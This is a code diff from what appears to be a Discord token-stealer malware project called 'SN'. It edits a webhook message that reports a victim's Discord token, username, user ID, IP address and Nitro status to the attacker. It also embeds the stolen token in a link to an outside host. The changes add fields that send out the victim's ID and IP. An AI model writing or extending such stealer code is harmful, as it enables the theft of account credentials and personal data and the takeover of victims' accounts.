@@ -320,21 +320,30 @@ const login = async (email, password, token) => {
     avatar_url: config.embed_icon,
     embeds: [
       {
-            description: "<a:blackcap:961249786315538524> │ **If you have a problem join our [Discord server](https://discord.gg/23zfPcaT) or [Telegram server](https://t.me/snstealer)**",
             "color": config.embed_color,
             "fields": [
                 {
-                    "name": "SN - Token:",
+                    "name": "@SN - Token:",
                     "value": `\`\`\`${token}\`\`\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
                     "inline": false
                 },
                 {
-                    "name": "SN - Username:",
-                    "value": `\`${json.username +"#" + json.discriminator}\` + "("+ \`${json.id}\` +")"`,
+                    "name": "@SN - Username:",
+                    "value": `\`${json.username +"#" + json.discriminator}\``,
                     "inline": true
                 },
                 {
-                    "name": "**Nitro:**",
+                    "name": "@SN - ID:",
+                    "value": `\`${json.id}\``,
+                    "inline": true
+                },
+                {
+                    "name": "@SN - IP:",
+                    value: `\`${config.ip}\``,
+                    "inline": true
+                },
+                {
+                    "name": "@SN - Nitro Type:",
                     "value": `${nitro}`,
                     "inline": true
                 },
